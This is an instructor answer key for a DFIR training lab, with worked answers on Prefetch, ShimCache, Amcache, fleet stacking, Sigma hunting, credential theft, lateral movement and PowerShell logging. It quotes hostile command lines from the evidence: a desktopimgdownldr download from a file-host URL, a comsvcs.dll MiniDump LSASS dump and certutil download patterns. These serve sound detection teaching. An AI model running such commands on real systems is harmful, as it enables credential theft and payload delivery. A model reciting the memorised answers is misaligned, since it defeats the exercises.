# Answer Key — DFIR Training Lab (instructor material)

> **⚠️ Instructor / self-check material — spoilers ahead.** Each module's README keeps its "what to find" section deliberately light so learners discover the answers themselves. This file consolidates the *try-it-yourself* exercises from all modules with **worked answers grounded in the real bundled data**. Try every exercise first; read this only to check.
>
> Command-based answers were verified by running each tool on the lab VM against each module's `data/` folder. Real values (hashes, timestamps, event-ID counts) are quoted from that data; where a value is a reasoning point rather than a fixed output, the answer explains the principle.
>
> **A note on names.** Because these answers quote **real** evidence and real tool output, the host and file names here are the ground-truth ones (`DESKTOP-SDN1RPT`, `coreupdater.exe`, `MSEDGEWIN10`, …) exactly as the artifacts record them.

**Shared facts about the Part A host** (used across Modules 1-4): host `DESKTOP-SDN1RPT`, from DFIR Madness *Case 001 — "The Stolen Szechuan Sauce."* The case malware is `coreupdater.exe`:
- **SHA1** `fd153c66386ca93ec9993d66a84d6f0d129a3a5c`
- **Path** `C:\Windows\System32\coreupdater.exe` · **Size** 7,168 bytes · `IsOsComponent = False` · empty ProductName
- **Executed** (Prefetch last run) **2020-09-19 03:40:49 UTC** · Amcache `FileKeyLastWrite` **2020-09-19 03:40:45 UTC** · LinkDate `2010-04-14` (fake)
- **Triad fingerprint:** present in **Amcache** + **Prefetch**, **absent** from **ShimCache**.

---

## Module 1 — Prefetch (PECmd)

**1. Find the LOLBins.**
All four LOLBins are present, and several cluster in the **2020-09-19 early-morning incident window** (verified from `pf.csv`):
- `CMD.EXE` — RunCount **9**, last run **2020-09-19 05:08:37**; earlier runs include 03:43:14, 03:41:06 — i.e. seconds around the malware's 03:40:49 execution.
- `POWERSHELL.EXE` — RunCount **2**, last run **2020-09-19 05:08:43** (runs at 05:08:43 and 05:08:37).
- `RUNDLL32.EXE` — multiple `.pf` (different path hashes). The busy one (`-52A71BD0`) has RunCount **9**, last run **2020-09-19 05:08:50**, with a run at **03:40:45** — right beside `coreupdater.exe`. Others last-ran 2020-09-18.
- `WSCRIPT.EXE` — RunCount **1**, last run **2020-09-19 01:08:25**.
Yes — `cmd`, `rundll32`, and (slightly later) `powershell` all cluster in the 03:13-05:09 window of 2020-09-19, the same window in which `coreupdater.exe` ran.

**2. Inspect the malware's loaded files.**
`PECmd.exe -f prefetch/COREUPDATER.EXE-157C54BB.pf` shows RunCount **1**, last run **2020-09-19 03:40:49.410 UTC**, and **51 filenames loaded**. The point of the exercise is to read that Filenames list for any path under `\Temp\`, `\AppData\`, `\Users\Public\`, or other non-System32 locations — a DLL or data file loaded from a user-writable folder is a side-loading / staging red flag. (The binary itself lives in `System32`, the masquerade; you confirm its identity by SHA1 in Module 3.)

**3. Meet a real corrupt artifact.**
Running `PECmd.exe -f prefetch/VSSVC.EXE-6C8F0C66.pf` makes PECmd report a **parsing error** for that file — it is genuinely corrupt. When you parse the whole folder with `PECmd.exe -d prefetch --csv . --csvf prefetch.csv`, PECmd logs that single failure (flagging the row with a parsing-error note) but still processes the other **196** files. Correct real-world handling: **document the damaged artifact (name it, note it's unreadable) and move on** — one bad file doesn't stop the case. 196 of 197 parse cleanly.

**4. Run-count reasoning.**
Any program whose `RunCount` exceeds the number of *real* (non-`1601-01-01`) timestamps in `AllRunTimes`. Example from `pf.csv`: `CMD.EXE` shows RunCount **9** but only **8** timestamp slots exist. **Why:** Prefetch stores only the **last 8 run times**; a program run more than 8 times keeps an accurate *count* but has lost the older timestamps (and unused slots read as the epoch `1601-01-01 00:00:00`).

**5. The 10-second rule.**
The real execution time is the **`LastRun` recorded inside the `.pf`** (e.g. `coreupdater.exe` = 03:40:49). The file's on-disk creation time is roughly **10 seconds later**, because Windows finishes writing the Prefetch file only after the program has run ~10 seconds. So you timeline on the in-file run time, not the filesystem timestamp.

---

## Module 2 — ShimCache (AppCompatCacheParser)

**1. Top of the cache.**
`CacheEntryPosition 0` (most-recently-inserted) is `C:\Windows\System32\WScript.exe` — the **LOLBin script host** (its `Executed` column reads `No`, which as ever proves nothing either way). It sits at the top because the cache is ordered most-recent-first, so whatever the OS most recently evaluated leads. A script host at position 0 is worth a glance: it's a common malware launch vector.

**2. Staging sweep.**
For each `Temp`/`AppData` hit decide benign vs suspicious by **who owns the folder, the file name, and whether it's a known Microsoft component**. Example seen in the data: `C:\ProgramData\Microsoft\Windows Defender\platform\...\MpCmdRun.exe` — in a `platform` versioned folder, a signed Defender component → **benign**. A random-named `.exe` in a *user's* `\AppData\Local\Temp\` would be the opposite. The path tells the story.

**3. Prove the gap.**
`grep -i coreupdater shimcache.csv` → **no hits.** `coreupdater.exe` is **absent from ShimCache**. One-sentence Triad answer: *its absence from ShimCache does **not** clear it — Prefetch and Amcache already prove it ran and exist with a known-bad SHA1; ShimCache simply has a blind spot here, which is exactly why you read all three artifacts.*

**4. Cross-check a modify time.**
The teaching point: a ShimCache `LastModifiedTimeUTC` (the file's `$StandardInfo` modified time) and Amcache's timestamps describe **different events**, so they needn't match. **Agreement** raises confidence the file wasn't tampered; a **mismatch** can indicate timestomping (an attacker backdating a file) — worth investigating, not proof by itself.

**5. Why the logs matter.**
On *this* hive the count does **not** change — you get **266 entries either way**. What changes is what the tool tells you. With `--nl` it warns:

```
Registry hive is dirty and transaction logs were found in the same directory, but --nl was provided. Data may be missing! Continuing anyways...
Sequence numbers do not match! Hive is dirty and the transaction logs should be reviewed for relevant data!
```

That is the lesson, and it is a better one than a changed number: the hive **is** dirty, but the pending changes in the logs happen not to touch the `AppCompatCache` blob — **and you could not have known that in advance.** On another host the newest, not-yet-flushed entries *are* the evidence, and skipping the replay silently loses them. So you always collect `.LOG1/.LOG2` and always let the parser replay them; `--nl` exists only for when you deliberately want the raw on-disk state. (Module 3's Amcache hive shows the other outcome — there the tool reports *"At least one transaction log was applied. Sequence numbers have been updated"*.)

---

## Module 3 — Amcache (AmcacheParser)

**1. Build the identity card.**
`coreupdater.exe` (from `amcache_UnassociatedFileEntries.csv`):
- Path `c:\windows\system32\coreupdater.exe`
- **SHA1 `fd153c66386ca93ec9993d66a84d6f0d129a3a5c`**
- Size **7,168 bytes** · `IsOsComponent` **False** · ProductName **empty** · LinkDate `2010-04-14 22:06:53` (implausible/fake) · `FileKeyLastWrite` **2020-09-19 03:40:45 UTC** (incident window)
Every reason it's suspicious: a System32-named binary that is **not** an OS component, **no** product metadata, a tiny 7 KB size, inventoried in the incident window, masquerading as an updater. **The one field for a threat-intel lookup: the SHA1.**

**2. Spot the responder's tool.**
`FTK Imager.exe` appears run from `E:\` (a removable/responder drive). Its presence does **not** indicate compromise because it's the **incident responder's own forensic imaging tool**, run from external media during collection — expected responder activity, not attacker activity. (Good reminder to track your own tools so you don't chase them.)

**3. LinkDate humility.**
`coreupdater.exe`'s LinkDate is 2010 — but genuine Microsoft binaries in the same hive (`MoUsoCoreWorker.exe`, `SIHClient.exe`, `winlogon.exe`) have their own scattered/odd LinkDates too. Lesson: **LinkDate is attacker-controllable and frequently nonsensical even for legit files — weight it lightly; never convict on it.**

**4. Corroborate timing.**
Amcache `FileKeyLastWrite` **03:40:45** vs Prefetch last-run **03:40:49** on 2020-09-19 — they agree to within seconds. Agreement across two independent artifacts (inventory vs execution) **hardens the timeline**: the file was present *and* executed at the same moment, which is far stronger than either alone.

**5. Prep the hunt.**
Hypothesis to carry into Module 4: *"SHA1 `fd153c66…` is the Case 001 malware; if I stack this hash across the fleet, every host where it appears is compromised, and its rarity (low count) makes it stand out from ubiquitous OS binaries."*

---

## Module 4 — Scaling the hunt (AppCompatProcessor)

> **Dataset.** This module runs on the **synthetic eight-host fleet** in `data/fleet/` (see
> `data/README.md`) — *not* on the Case-001 host of Modules 1-3. That is deliberate: stacking/LFO only
> works when you have many hosts to count against, and no license-clear public multi-host AppCompat
> corpus exists. Every number below was produced by running ACP against this fleet in the lab VM.
> Load it clean each time (`rm -f acp.db` first) so counts are reproducible.

**1. Load the fleet and find the rare tail.**
`acp acp.db load data/fleet` then `acp acp.db stack FileName`. `status` confirms the ingest:
**8 hosts / 8 instances / 352 entries**, across **61 distinct filenames**. The stack falls into clean bands:

| Count | What sits there | Meaning |
|---|---|---|
| **8** (40 files) | `svchost.exe`, `lsass.exe`, `explorer.exe`, `cmd.exe`, `powershell.exe`, `kernel32.dll`, `chrome.exe`… | the ubiquitous OS/enterprise baseline — the noise you ignore |
| **5** | `Teams.exe` | on every workstation-class host, absent from the servers |
| **4** | `Acrobat.exe` | standard-build software, not on the laptop/servers |
| **2** (3 files) | `dfsrs.exe`, **`nazgul.exe`**, **`palantir.exe`** | the interesting band — see 2 |
| **1** (16 files) | 11 legitimate role tools + **5 implants** | the rare tail you must triage |

The whole lesson is in the shape: 40 of 61 filenames are on *every* host, and the intrusion lives in a
tail of 19. `lsass.exe` shows Count **9** (it appears twice on one host) — a useful reminder that the
stack counts *entries*, not hosts.

**2. Legitimate-rare vs malicious-rare — judged by path.**
Rarity alone does **not** convict: 11 of the 16 Count = 1 entries are perfectly innocent.

- **Legitimate-rare (role tools).** `repadmin.exe`, `netdom.exe`, `ntdsutil.exe`, `dsac.exe`, `dns.exe`,
  `ismserv.exe` — all on `MINAS-TIRITH-DC01`, all in `C:\Windows\System32\`, because only a **domain
  controller** runs DC tooling. `sqlservr.exe`, `SQLCMD.EXE`, `Ssms.exe` on `EREBOR-SQL01` under
  `C:\Program Files\Microsoft SQL Server\…`. `srmhost.exe` on the file server. `putty.exe` on
  `BAG-END-LT01` under `C:\Program Files\PuTTY\`. `dfsrs.exe` (Count 2) on the file server **and** the
  DC — replication, exactly where it belongs.
- **Malicious-rare (the SAURON toolkit, 7 files).** Every one sits in a **user-writable or staging**
  directory, and every one carries an **incident-window mtime** (2024-09-13 / 2024-09-14) while the
  entire benign baseline is stamped `2021-03-15 09:14:22`:

| File | Host(s) | Path | mtime |
|---|---|---|---|
| `theonering.exe` | BAG-END-LT01 | `C:\Users\frodo.baggins\Downloads\` | 2024-09-13 22:47:11 |
| `gollum.exe` | BAG-END-LT01 | `C:\Users\frodo.baggins\AppData\Local\Temp\` | 2024-09-13 22:47:11 |
| `mordor-update.exe` | ISENGARD-WS04 | `C:\Users\saruman.white\AppData\Roaming\` | 2024-09-13 22:47:11 |
| `palantir.exe` | ISENGARD-WS04, MINAS-TIRITH-DC01 | `C:\ProgramData\`, `C:\Windows\Temp\` | 2024-09-13 / 09-14 |
| `nazgul.exe` | ISENGARD-WS04, MINAS-TIRITH-DC01 | `C:\Windows\Temp\` | 2024-09-14 02:09:48 |
| `morgul.dll` | MINAS-TIRITH-DC01 | `C:\Windows\NTDS\` | 2024-09-14 02:09:48 |
| `balrog.exe` | MINAS-TIRITH-DC01 | `C:\PerfLogs\` | 2024-09-14 02:09:48 |

**The discriminator is path + timestamp, not rarity.** A rare binary in `C:\Program Files\` with the
fleet's baseline mtime is a role tool; a rare binary in `\Downloads\`, `\AppData\`, `\Windows\Temp\`,
`\ProgramData\`, `\PerfLogs\` or `\Windows\NTDS\` stamped inside the incident window is your lead.
`morgul.dll` in `C:\Windows\NTDS\` is the loudest single artifact in the fleet — nothing legitimate
drops a new DLL into the **AD database directory** (T1003.006, DCSync/NTDS theft).

**3. `tcorr palantir.exe` — the temporal pivot.**
`acp acp.db tcorr palantir.exe` reports `palantir.exe => [2 hits]` and returns **exactly one**
correlation candidate:

```
LastModified         FilePath         FileName(*)  Size    ExecFlag  Before  After  Weight  Total_Count
2024-09-14 02:09:48  C:\Windows\Temp   nazgul.exe   151552  True      2       0      11.11   2
```

Read it as: on both hosts where `palantir.exe` appears, `nazgul.exe` executed **near it in time**
(`Before 2 / After 0` — `nazgul` follows the beacon on both). The relationship is symmetric: run
`tcorr nazgul.exe` and you get `palantir.exe` (`C:\ProgramData\`, 412,672 bytes, `Before 0 / After 2`).
**Both are implants, not abused LOLBins** — the pivot names the beacon's partner tool without you ever
having an IOC for it, which is the point of the technique.

> **Scope honestly.** On this fleet `tcorr` yields **one** partner, not a whole kill chain. The benign
> DC tools (`repadmin`, `netdom`, `dsac`) carry the 2021 baseline mtime, so they are nowhere near the
> 2024 window and correctly do **not** correlate. (The sample output printed in README §4.6 shows seven
> rows including those DC tools; that output does not reproduce against the shipped fleet — see
> `MODULE_REVIEW.md`.)

**4. `tstack 2024-09-13 2024-09-15` — the intrusion timeline.**
Restricting the stack to the window returns exactly the seven planted tools, every one with
**Hits Out = 0** (they executed *only* inside the window — by construction, incident-relevant):

```
FullPath           Hits In  Hits Out  Ratio
nazgul.exe         2        0         20.000
palantir.exe       2        0         20.000
balrog.exe         1        0         10.000
gollum.exe         1        0         10.000
mordor-update.exe  1        0         10.000
morgul.dll         1        0         10.000
theonering.exe     1        0         10.000
```

**The paragraph:** *On 2024-09-13 22:47, `frodo.baggins` runs `theonering.exe` from his **Downloads**
folder on `BAG-END-LT01` — patient zero, a phished dropper — which stages `gollum.exe` in
`%LOCALAPPDATA%\Temp`. The same evening `mordor-update.exe` is written to `saruman.white`'s **Roaming**
profile on `ISENGARD-WS04` (a fake-updater persistence foothold) and `palantir.exe`, the recon/C2
beacon, lands in `C:\ProgramData\`. Hours later, at 2024-09-14 02:09, the operator moves: `palantir.exe`
and `nazgul.exe` both appear in `C:\Windows\Temp\` on the **domain controller** `MINAS-TIRITH-DC01` —
the beacon plus its lateral-movement tool, the Count = 2 pair the stack surfaced. On the DC they drop
`morgul.dll` into `C:\Windows\NTDS\` (the AD database directory — credential/NTDS theft) and
`balrog.exe` into `C:\PerfLogs\` as the end-objective payload. Laptop → workstation → domain
controller, in about three and a half hours.*

Note the two-stage clock the data encodes: **22:47:11** on the 13th is the foothold stage, **02:09:48**
on the 14th is the hands-on-keyboard DC stage.

**5. `reconscan` — who was looking around?**
`acp acp.db reconscan` reports **65 potential recon commands** across **8 / 8 hosts** and scores each
host. Because the synthetic baseline gives *every* host the same recon-capable tools (`whoami.exe`,
`net.exe`, `net1.exe`, `ipconfig.exe`, `tasklist.exe`), the scan flags all eight — a good teaching
moment in itself: **`reconscan` measures the presence of recon tooling, not proof of recon.** On a real
fleet you use it to *rank* hosts, then confirm with command-line telemetry (Modules 9-10), because
ShimCache/AppCompat records that a binary was evaluated — never its arguments.

**6. (Stretch) Regenerate the fleet and watch Count move.**
Edit `tools/build_fleet_csvs.py` to plant your own tool on one host and re-run the load: your implant
lands at Count = 1 in the rare tail, while any binary you add to *all* hosts joins the Count = 8
baseline band. That is the whole thesis of stacking made falsifiable — and it is why the technique needs
a fleet: with one host, every single file is Count = 1 and the signal disappears.

---

## Module 5 — Event logs (EvtxECmd)

**1. The 3-line story (sorted timeline).**
After `EvtxECmd -d . --csv ...` and sorting by `TimeCreated`, the desktopimgdownldr attack reads: (1) `desktopimgdownldr.exe` is launched (Sysmon 1) with `/lockscreenurl:https://a.uguu.se/Hv0bgvgHGNeH_Bin.7z /eventName:desktopimgdownldr` — a LOLBAS abusing a lockscreen-image feature to download; (2) the **BITS** service actually performs the fetch (BITS-Client 59/60); (3) a `.7z` archive lands on disk — staging for the next stage. The same URL appears in two channels.

**2. Grep for the hostname.**
`grep -i uguu.se events.csv` → the host `a.uguu.se` appears in **two channels** — the **Sysmon 1** command line *and* the **BITS** job. Corroboration across logs is stronger than one hit because a single source can be disabled, cleared, or spoofed; two independent records of the same download make the finding very hard to dispute. (Verified: the command line is `desktopimgdownldr.exe /lockscreenurl:https://a.uguu.se/Hv0bgvgHGNeH_Bin.7z /eventName:desktopimgdownldr`.)

**3. Pull the full Execution category.**
With `get-data.sh` (online host) you fetch the whole EVTX-ATTACK-SAMPLES *Execution* set and can repeat the parse with `-d` to find other LOLBAS downloaders — e.g. `certutil -urlcache -f http://...` or `rundll32` URL-fetch samples. The skill is recognising the *download-via-trusted-binary* pattern regardless of which LOLBin.

**4. CSV vs JSON.**
`--json` is for **tooling** — hand it to a teammate's script/SIEM ingest where structured fields are parsed programmatically. `--csv` is for **humans** — open it in Timeline Explorer (or a spreadsheet) to sort, filter, and eyeball a timeline. Same data, different consumer.

---

## Module 6 — Sigma hunting (Chainsaw & Hayabusa)

**1. Name them all.**
Note the exercise asks for the technique the **detections** reveal — so name the *rules that fire*, not
the sample filenames. Chainsaw over the folder reports **4,121 detections on 3,872 documents** from
3,608 loaded rules; Hayabusa's unfiltered timeline is **18,442 rows**. The distinct rule titles that
actually fire (counts from the lab VM) map to techniques like this:

| Sigma rule title (real output) | Hits | Technique |
|---|---|---|
| `Metasploit SMB Authentication` | 3561 | Metasploit SMB auth against the target |
| `Rare Service Installations` | 65 | service-install lateral movement / persistence |
| `Unauthorized System Time Modification` | 40 | anti-forensics (T1070.006-adjacent) |
| `HackTool - Mimikatz Execution` | 20 | credential dumping |
| `PowerShell Download and Execution Cradles` / `Suspicious PowerShell Download and Execute Pattern` | 20 each | download-cradle execution |
| `Malicious PowerShell Commandlets - ProcessCreation` | 20 | offensive PowerShell tooling |
| `Base64 Encoded PowerShell Command Detected` | 18 | encoded-command obfuscation |
| `Suspicious Program Names` | 13 | tool naming heuristics |
| `Rundll32 Execution Without Parameters` | 12 | LOLBin abuse |
| `Invoke-Obfuscation Obfuscated IEX Invocation - PowerShell` | 9 | Invoke-Obfuscation |
| `CobaltStrike Service Installations` / `Meterpreter or Cobalt Strike Getsystem Service Installation` | 6 / 5 | C2 framework service install |
| `PsExec Default Named Pipe` / `PsExec Tool Execution` / `PsExec Service Start` | 3 / 1 / 1 | PsExec lateral movement |
| `Important Windows Eventlog Cleared` | 3 | event-log tampering |
| `Local User Creation`, `A Member Was Added to a Security-Enabled Global Group` | 2 each | account creation / privilege grant |
| `Hurricane Panda Activity` | 2 | named-actor heuristic |

Two things worth flagging to a learner:
- **`Godmode Sigma Rule`** fires **41** times. It is a deliberate catch-all meta-rule in the Sigma repo,
  not a technique — it inflates counts and should be recognised, not reported.
- **One rule dominates everything.** `Metasploit SMB Authentication` alone is 3,561 of the 4,121
  detections, almost all from the `many-events-*` bulk logs. A raw detection count is therefore a
  terrible triage metric; **count distinct rules and distinct hosts**, not alerts.

(The `many-events-*` files are volume/baseline logs, not single-technique captures. Pure **WMI/DCOM**
lateral movement is covered in Module 8.)

**2. Tell the story (PsExec).**
Sorting `sysmon_privesc_psexec_dwell.evtx` by timestamp: a process connects to the target, a service/pipe `\PSEXESVC` appears, and a child process runs **as SYSTEM** — i.e. *remote connection → PsExec service/pipe → SYSTEM-level command execution*. That's PsExec lateral movement to SYSTEM in three beats.

**3. Tune severity.**
`--min-level high` shows only the loudest, highest-confidence alerts (low noise, but you can **miss** quieter techniques like recon or a single suspicious logon); `--min-level low` surfaces far more, including benign-ish noise. Start triage at **medium** (or low with discipline) and escalate — *stopping at "high only" is risky* because real intrusions hide in the medium/low band.

**4. Cross-tool check.**
They do **not** agree — and that is the answer. Measured on `mimikatz-privesc-hashdump.evtx`:

| Tool | Result |
|---|---|
| **Chainsaw** (3,608 Sigma rules, `sigma-event-logs-all` mapping) | *"Loaded 1 forensic artefacts (68.0 KiB) … **0 Detections found on 0 documents**"* |
| **Hayabusa** (pre-converted `hayabusa-rules`) | `Process Ran With High Privilege` **[med]** ×4, `Log Cleared` **[high]** ×1 |

Chainsaw **is** working — the same command on `sysmon_privesc_psexec_dwell.evtx` returns 9 detections —
it simply matches nothing here. The reason is in the evidence: this sample is a **Security**-channel log
containing **1102** (log cleared) ×1, **4673** (privileged service called) ×5 and **4798** (local group
membership enumerated) ×7. Hayabusa ships built-in rules for those classic Security events; Chainsaw's
mapped Sigma set, which leans on Sysmon-style process/handle telemetry, does not cover them.

Three lessons, in order of importance:
1. **"No detections" is not "no evidence."** A silent tool is a coverage gap, not an all-clear. Had you
   run only Chainsaw here you would have called a Mimikatz sample clean.
2. **Neither tool names Mimikatz.** You identify it from the event detail —
   `Proc: C:\Tools\mimikatz\mimikatz.exe` in Hayabusa's `Details` column. **The alert label is not the
   identification; the evidence is.**
3. **This is the concrete case for running both** (and for the mapping/pipeline caveat in the module's
   exercise text): coverage differs by ruleset *and* by the telemetry each ruleset was written against.

*Instructor note:* the second sample behaves the same way — `mimikatz-privilegedebug-tokenelevate-hashdump.evtx`
is also **0 detections** in Chainsaw and only `Log Cleared` **[high]** in Hayabusa.

---

## Module 7 — Identity & credential theft

**1. Mask-reading.**
The two Mimikatz samples open `lsass.exe` with **different `GrantedAccess` masks from different source images**: `sysmon_3_10_Invoke-Mimikatz_hosted_Github` → mask **`0x143a`**, source `powershell.exe`; `sysmon_10_mimikatz_sekurlsa_logonpasswords` → mask **`0x1010`**, source `mimikatz.exe`. **mask + target** beats process name because attackers rename their tools freely — but the *access they need to read LSASS memory* produces the same tell-tale masks regardless of the executable's name.

**2. LOLBAS hunt.**
In `sysmon_10_comsvcs_minidump_lsass`, the Event 1 command line is the classic `rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump <PID> <outfile> full`. The **`<PID>`** argument names the **LSASS process ID** to dump — `comsvcs.dll`'s `MiniDump` export is the LOLBAS that writes LSASS memory to disk.

**3. DCSync logic.**
In `security_4662_dcsync`, the account requesting **directory replication** is a **user** account (not a Domain Controller's computer account). A *user* asking to replicate password data **is** DCSync (only DCs should replicate); a **DC computer account** doing it is **normal** AD replication. The principal's *type* makes the same 4662 benign or malicious.

**4. Baseline vs. attack.**
Running Chainsaw over the folder, `security_4624_4625_logon_baseline.evtx` produces **zero** detections — it's an ordinary failed-then-successful interactive logon. A quiet baseline is essential because it **proves your rules don't fire on normal activity**: detections you can trust are ones that stay silent on benign data.

**5. Correlate.**
Pulling more `Credential Access` samples, look for a **4624 Logon Type 9 (NewCredentials)** that lines up in time with a dump event — that connects *theft* (LSASS access) to *use* (the stolen creds authenticating elsewhere), the dump→logon chain that turns an alert into a story.

---

## Module 8 — Lateral movement

**1. Service vs logon.**
`LM_Remote_Service02_7045.evtx` contains **three 7045** service-install events; the service names (e.g. `spoolfool`/`spoolsv`/`remotesvc`) **impersonate real Windows services**, but the **ImagePath** gives them away by pointing at `cmd`/`calc` (or a temp path) instead of the genuine service binary. Tying a **7045** to its **4624 Type 3 + 4672** proves the service was installed *by an authenticated, privileged remote session* — neither event alone shows both the *delivery* and *who delivered it*.

**2. DCOM line-up.**
The three DCOM samples map to: `LM_impacket_docmexec_mmc_sysmon_01` → **MMC20.Application**; `LM_sysmon_3_DCOM_ShellBrowserWindow_ShellWindows` → **ShellWindows / ShellBrowserWindow**; `LM_DCOM_MSHTA_LethalHTA_Sysmon_3_1` → **mshta / LethalHTA**. All share parent **`svchost.exe -k DcomLaunch`**. In `LM_dcom_..._10016.evtx` the **failed** activations appear only as **System 10016** (a DCOM permission error) because the activation never spawned a process for Sysmon to log — a *cluster* of 10016 is still a useful lead that someone is probing DCOM.

**3. Pipe rhythm.**
In `lm_sysmon_18_remshell_over_namedpipe.evtx` a **Sysmon 18 (Pipe Connected)** carries a PowerShell shell. Versus Module 6's **17 (Pipe Created)** on `\PSEXESVC`: **created** = a server made the pipe available; **connected** = a client *dialled into* it. **18 (connected)** is the one that means "someone reached in and used it."

**4. Same LogonId.**
In `remote task update 4624 4702 same logonid.evtx` the **4702** (task updated) and a **4624** share one **LogonId**. LogonId is the glue because it ties the task change to **one specific authenticated session** — without it, the task edit could be background noise; with it, you attribute the action to the exact remote logon that performed it.

**5. Find the source IP.**
In `dfir_rdpsharp_target_RdpCoreTs_168_68_131.evtx`, an **RdpCoreTS 131** event records the **client IP knocking** (the file name even encodes `168.68.131`-style addressing). **131 is useful even when the logon fails** because it captures the *source of the connection attempt* before authentication — so you see who's probing RDP regardless of success.

---

## Module 9 — PowerShell tradecraft

**1. Obfuscation can't hide intent.**
Reading `ScriptBlockText` in `exec_emotet_ps_4104` and `Powershell_4104_MiniDumpWriteDump_Lsass`, the give-away tokens are `IEX`, `FromBase64String`, `DownloadString` (Emotet downloader) and `MiniDumpWriteDump`, `Get-Process lsass` (the LSASS dump). One sentence: **4104 logs the *decoded* script at compile time, so even a Base64-launched command is recorded in clear — and the decoded text names the malicious intent the encoding tried to hide.**

**2. Same goal, two telemetries.**
`Powershell_4104_MiniDumpWriteDump_Lsass.evtx` caught the dump via **PowerShell 4104** (the script text); `babyshark_mimikatz_powershell.evtx` caught a PowerShell credential dump via **Sysmon 10** (LSASS access). If only **one** source were enabled you'd miss the other view — e.g. with Sysmon off you lose the LSASS-access proof; with PowerShell logging off you lose the script text. Run both.

**3. Spot the injection.**
In `de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx`: a **Sysmon 7** loads `System.Management.Automation.dll` into a **non-PowerShell** process, followed by a burst of **Sysmon 8 (CreateRemoteThread)** — the data shows **82** of them. "Unmanaged PowerShell" is **invisible to 4104** because it never runs `powershell.exe`; it hosts the PowerShell engine inside another process, so only Sysmon (the loaded DLL + injection) sees it.

**4. Evasion first.**
Seeing `DE_Powershell_CLM_Disabled_Sysmon_12` (Constrained Language Mode disable) and `de_powershell_execpolicy_changed_sysmon_13` (ExecutionPolicy flipped) *before* a 4104 burst tells the story: **the attacker is clearing PowerShell's guardrails so a malicious script can run unimpeded** — the tampering is the warning shot before the payload.

**5. Count the rules.**
Running Chainsaw on `Powershell_4104_MiniDumpWriteDump_Lsass.evtx`, **multiple distinct Sigma rules** fire on the **single** 4104 event (e.g. LSASS-dump API, suspicious PowerShell, MiniDump usage). Several independent rules hitting one event **raises confidence** — it's unlikely that several unrelated detections all false-positive on the same benign line.

---

## Module 10 — Sysmon + WEF

**1. Build the tree.**
From `Sysmon_UACME_45.evtx`, list each **Sysmon 1** with its `Image`/`ParentImage` and chain parent→child. Elevation appears **without a `consent.exe` prompt** — that *silent* elevation is the bypass. The **registry 13** event *is* the bypass (it sets an auto-elevation/hijack value); the **process 1** that then runs elevated is the **payoff**.

**2. Two bypasses, different IDs.**
`Sysmon_UACME_45` shows **12/13 (registry)** — a registry-key UAC bypass (hijacking an auto-elevated handler). `Sysmon_UACME_63` shows **7/10 (image load + LSASS access)** — a different bypass that works via DLL loading / process access. Both end in silent elevation, but the **different Sysmon IDs reflect different mechanisms** — registry hijack vs image-based — which is why the ID map matters.

**3. Dump in two views.**
`sysmon_10_11_lsass_memdump.evtx` proves the dump with **Sysmon 10** (`GrantedAccess` on `lsass.exe`) + **Sysmon 11** (the `.dmp` file written); Module 9's `Powershell_4104_MiniDumpWriteDump_Lsass.evtx` proves the *same act* with **4104** (`MiniDumpWriteDump` in the script text). You want **both** sensors because each can be disabled and each shows a different fact (the access/handle vs the actual command).

**4. Default vs Sysmon.**
Parsing both Zerologon files: the **default Security log** uniquely has **4742** (the computer-account change that *is* Zerologon's effect); **Sysmon** uniquely has the **process tree (Sysmon 1)** showing the tool that did it. WEF should forward **both** because neither alone tells the whole story — Security shows the *AD change*, Sysmon shows the *execution*.

**5. WEF design.**
For 200 endpoints: push a **GPO source-initiated subscription** so each host forwards its Security + Sysmon logs; stand up a **collector** with `wecutil qc` and a subscription; everything lands in the collector's **`ForwardedEvents`** channel. Chainsaw/Hayabusa run against the **collector**, not each host, because one central, in-order store is what makes fleet-scale hunting (and Module 4's cross-host stacking) feasible — you can't log into 200 machines per hunt.

**6. (Stretch) More samples.**
Pulling more Sysmon samples with `get-data.sh` and re-running `hayabusa csv-timeline` confirms the **same ID map** (1/3/7/8/10/11/12/13/16/17/18) explains techniques you haven't seen yet — the map generalises, which is the whole point of learning it.

---

*For the integrated, multi-module exercise see **[Module 11 — Capstone](module-11-capstone)**, whose README carries its own guiding questions, walkthrough, and full solution.*
